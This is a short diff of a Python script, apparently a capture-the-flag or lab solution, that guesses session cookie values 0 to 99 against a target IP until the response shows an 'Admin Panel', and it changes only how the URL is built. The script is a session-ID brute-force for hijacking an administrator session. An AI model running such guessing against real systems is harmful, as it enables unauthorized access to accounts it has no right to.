@@ -7,7 +7,7 @@ if (len(sys.argv) != 2):
 ip_address = sys.argv[1]
 
 for i in range(100):
-    r = requests.get(f'http://{ip_address}/',
+    r = requests.get(f'{ip_address}/',
                      cookies={'CyberSkillerSESSID': str(i)})
     if 'Admin Panel' in r.text:
         print(i)
